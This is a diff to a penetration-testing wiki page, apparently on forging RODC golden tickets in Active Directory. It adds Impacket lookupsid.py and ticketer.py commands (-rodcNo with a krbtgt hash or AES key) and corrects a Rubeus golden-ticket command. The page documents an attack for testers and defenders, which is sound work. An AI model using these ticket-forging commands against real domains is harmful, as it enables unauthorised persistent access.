@@ -18,7 +18,24 @@ With administrative access to an [RODC](../../builtins/rodc.md), it is possible 
 
 === UNIX-like
 
-_For the moment, no tool is available to only forge a RODC Golden Ticket from UNIX-like systems._
+> [!NOTE]
+> _At the time of writing, 15th Apr. 2026,_ [_the pull request_](https://github.com/fortra/impacket/pull/2169) _adding the `-rodcNo` flag in `ticketer.py` is pending._
+
+There are [Impacket](https://github.com/fortra/impacket) scripts for each step of a golden ticket creation : retrieving the domain SID, creating the RODC golden ticket.
+
+```bash
+# Find the domain SID
+lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$DC_HOST" 0
+
+# Create the RODC golden ticket (with an RC4 key, i.e. NT hash)
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" $USER
+
+# Create the RODC golden ticket (with an AES 128/256bits key)
+ticketer.py -aesKey "$KRBTGT_AES_KEY" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" $USER
+
+# Create the RODC golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USER_RID" -groups "$GROUPID1,$GROUPID2,..." $USER
+```
 
 
 === Windows
@@ -27,7 +44,7 @@ From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be 
 
 
 ```powershell
-Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID
+Rubeus.exe golden /rodcNumber:$RODC_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:$USER /id:$USER_RID /domain:$DOMAIN /sid:$DOMAIN_SID
 ```
 
 
